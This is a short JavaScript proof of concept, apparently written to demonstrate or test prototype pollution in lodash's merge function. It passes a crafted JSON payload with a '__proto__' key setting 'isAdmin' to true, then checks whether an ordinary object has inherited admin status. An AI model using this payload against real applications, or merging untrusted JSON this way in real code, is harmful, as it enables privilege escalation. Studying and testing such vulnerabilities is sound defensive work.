import _ from "lodash";

function trigger() {
  const obj = {
    name: "John Doe",
    age: 30,
    role: "user",
  };

  const payload = '{"__proto__": {"isAdmin": true}}';
  _.merge({}, obj, JSON.parse(payload));
  console.log("Is admin:", obj.isAdmin);
}

trigger();
